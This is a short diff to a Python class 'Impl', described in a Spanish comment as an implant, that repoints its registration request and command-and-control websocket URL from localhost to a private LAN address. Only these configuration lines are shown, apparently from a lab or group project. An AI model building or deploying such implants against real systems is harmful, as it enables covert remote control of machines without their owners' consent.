@@ -536,7 +536,7 @@ class Impl:
             'impl_id': self.impl_id
         }
  
-        req = requests.post(f"http://localhost:4000/api/impl/new/{model['impl_id']}", data=model)
+        req = requests.post(f"http://192.168.100.12:4000/api/impl/new/{model['impl_id']}", data=model)
 
 
     @property
@@ -579,7 +579,7 @@ class Impl:
 
 if __name__ == "__main__":
     # Configuración del implante
-    C2_WS_URL = "ws://localhost:4000/api/rcv"
+    C2_WS_URL = "ws://192.168.100.12:4000/api/rcv"
     GROUP_NAME = "grupo1"
     
     impl = Impl(c2_ws_url=C2_WS_URL, group=GROUP_NAME)
